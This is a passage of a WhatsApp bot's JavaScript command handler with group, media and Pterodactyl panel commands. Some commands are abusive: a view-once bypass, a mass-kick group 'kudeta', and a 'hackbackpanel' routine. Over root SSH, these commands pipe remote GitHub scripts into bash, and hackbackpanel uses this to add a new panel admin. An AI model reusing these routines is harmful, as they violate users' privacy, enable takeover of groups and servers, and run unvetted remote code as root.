await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Sky.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Sky.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Sky.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let media = await Sky.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Rafzbot.png');

let teks = directLink.toString()
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let media = await Sky.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Rafzbot.png');
let teks = directLink.toString()
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let foto = await Sky.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await Sky.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "add": case "edotensei": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Sky.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Sky.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Sky.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Sky.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Sky.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Sky.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": case "tl": case "t": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Sky.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Sky.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Sky.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": case "h" :{
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
let member = m.metadata.participants.map(v => v.id)
if (!text) return m.reply(Sky.sendMessage(m.chat, {
text: `@${m.chat}\n${text}`,
contextInfo: {
mentionedJid: member, 
groupMentions: [
   {
groupSubject: `Dengarkan Notifnya\nRafzbot Hidetag\n> By Rafflieaditya`,
groupJid: m.chat,
    },
   ],
  },
}),{quoted: m})
await Sky.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "tagbiru":{
if (!m.isGroup) return Reply(await Sky.sendMessage(m.chat, {
text: `@${m.chat}`,
contextInfo: {
mentionedJid: qtext, 
groupMentions: [
{
groupSubject: `${text}`,
groupJid: m.chat,
},
],
},
}),{quoted: m}
)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
let member = m.metadata.participants.map(v => v.id)
if (!text) return m.reply(Sky.sendMessage(m.chat, {
text: `@${m.chat}\n${text}`,
contextInfo: {
mentionedJid: member, 
groupMentions: [
   {
groupSubject: `Dengarkan Notifnya\nRafzbot Hidetag\n> By Rafflieaditya`,
groupJid: m.chat,
    },
   ],
  },
}),{quoted: m})
await Sky.sendMessage(m.chat, {
text: `@${m.chat}`,
contextInfo: {
mentionedJid: member, 
groupMentions: [
{
groupSubject: `${text}`,
groupJid: m.chat,
},
],
},
}),{quoted: m}
}
break
        
//================================================================================
        
case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Sky.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "getft": case "gft": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await getBuffer(text)
await Sky.sendMessage(m.chat, {image: data}, {quoted: m})
}
break

//================================================================================

case "getvid": case "gvid": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await getBuffer(text)
await Sky.sendMessage(m.chat, {video: data}, {quoted: m})
}
break

//================================================================================

        
case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Sky.newsletterMetadata("invite", result)
await Sky.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Sky.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Sky.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Skyzo Starting 🔥")
for (let i of memberFilter) {
await Sky.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Sky.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Sky.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//================================================================================

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "subdomain": case "subdo": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

//================================================================================

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Sky.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
